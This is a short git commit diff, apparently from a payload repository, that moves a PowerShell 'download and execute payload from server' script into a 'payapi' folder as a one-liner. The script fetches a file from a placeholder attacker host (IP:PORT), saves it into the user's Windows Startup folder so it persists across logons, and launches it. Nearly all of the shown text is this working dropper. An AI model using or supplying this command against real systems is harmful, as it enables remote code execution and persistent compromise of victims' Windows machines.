e38dab18ffd81188ea88c87f89b3a5b3e4df84f6
azuk4r <no@host.com>
2024-09-20 16:34:28 +0000

    payapi folder

--- examples/powershell/download and execute payload from server.ps1
+++
@@ -1,6 +0,0 @@
-$payload = 'PAYLOAD'
-
-Invoke-WebRequest -Uri "http://IP:PORT/$payload" `
-	-OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
-
-Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
---
+++ payapi/powershell/exec.ps1
@@ -0,0 +1,1 @@
+$payload = 'PAYLOAD'; Invoke-WebRequest -Uri "http://IP:PORT/$payload" -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"; Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
